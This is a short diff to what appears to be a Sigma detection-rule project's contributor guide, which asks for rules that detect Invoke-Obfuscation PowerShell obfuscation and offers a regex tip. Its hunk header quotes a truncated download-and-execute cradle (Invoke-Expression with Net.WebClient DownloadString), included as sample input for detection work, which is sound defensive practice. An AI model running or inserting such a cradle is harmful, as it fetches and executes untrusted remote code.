@@ -16,7 +16,7 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 #### Just pick the obfuscation method(s) and the relevant Case(s) you prefer and write a Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved:  
 (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/>
 #### Just in case, a little tip for your regex development:
-e.g., you can copy the results from all cases for one obfuscation method and paste them in [regex101](https://regex101.com/) to find possible similarities while developing a regex (you can save your progress there and even apply a dark theme (: ). 
+you can copy the results from all cases for one obfuscation method and paste them in [regex101](https://regex101.com/) to find possible similarities while developing a regex (you can save your progress there and even apply a dark theme (: ). 
 
 ## Contents
 ##### SINGLE OBFUSCATION
